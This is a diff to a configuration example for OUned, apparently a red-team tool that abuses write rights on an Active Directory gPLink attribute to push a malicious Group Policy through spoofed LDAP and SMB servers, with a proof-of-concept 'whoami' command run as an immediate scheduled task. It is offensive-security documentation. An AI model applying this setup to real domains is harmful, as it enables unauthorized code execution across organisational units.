@@ -25,21 +25,26 @@ Each entry is described by a comment, but for detailed configuration instruction
 # The target domain name
 domain=corp.com
 
-# The target Organizational Unit name
-ou=ACCOUNTING
+# The target DC. If not specified, defaults to the domain name
+#dc=192.168.123.10
 
-# The username and password of the user having write permissions on the gPLink attribute of the target OU
+# The Distinguished Name of the target container
+containerDN=OU=SERVERS,DC=corp,DC=com
+
+# The username and password of the user having write permissions on the gPLink attribute of the target container
 username=naugustine
 password=Password1
 
 # The IP address of the attacker machine on the internal network
 attacker_ip=192.168.123.16
 
-# The command that should be executed by child objects
-command=whoami > C:\Temp\accounting.txt
+# The command that should be executed by child objects. Specifying a command will inject an immediate Scheduled Task
+command=whoami > C:\poc.txt
+# Alternatively to the 'command' option, you can provide a module file with the GroupPolicyBackdoor syntax - see https://github.com/synacktiv/GroupPolicyBackdoor/wiki. 'Command' and 'module' are mutually exclusive
+# module=Scheduledtask_add_computer.ini
 
 # The kind of objects targeted ("computer" or "user")
-target_type=user
+target_type=computer
 
 
 [LDAP]
@@ -57,28 +62,26 @@ ldap_password=Password1!
 gpo_id=7B7D6B23-26F8-4E4B-AF23-F9B9005167F6
 
 # The machine account name and password on the target domain that will be used to fake the LDAP server delivering the GPC
-# Do not forget to escape '%' signs by doubling them ! (e.g. '%%')
 ldap_machine_name=OUNED$
-ldap_machine_password=some_very_long_random_password_with_percent_signs_escaped
+ldap_machine_password=some_very_long_random_password
 
 [SMB]
 # The SMB mode can be embedded or forwarded depending on the kind of object targeted
-smb_mode=forwarded
+smb_mode=embedded
 
 # The name of the SMB share. Can be anything for embedded mode, should match an existing share on SMB dummy domain controller for forwarded mode
 share_name=synacktiv
 
-# The IP address of the dummy domain controller that will act as an SMB server
-smb_ip=192.168.126.206
+# The IP address of the dummy domain controller that will act as a SMB server. Only useful in forwarded mode
+#smb_ip=192.168.126.206
 
-# The username and password of a user having write access to the share on the SMB dummy domain controller
-smb_username=smbadm
-smb_password=Password1!
+# The username and password of a user having write access to the share on the SMB dummy domain controller. Only useful in forwarded mode
+#smb_username=smbadm
+#smb_password=Password1!
 
-# The machine account name and password on the target domain that will be used to fake the SMB server delivering the GPT
-# Do not forget to escape '%' signs by doubling them ! (e.g. '%%')
-smb_machine_name=OUNED2$
-smb_machine_password=some_very_long_random_password_with_percent_signs_escaped
+# The machine account name and password on the target domain that will be used to fake the SMB server delivering the GPT. Only useful in forwarded mode
+#smb_machine_name=OUNED2$
+#smb_machine_password=some_very_long_random_password
 ```
 
 # OUned usage
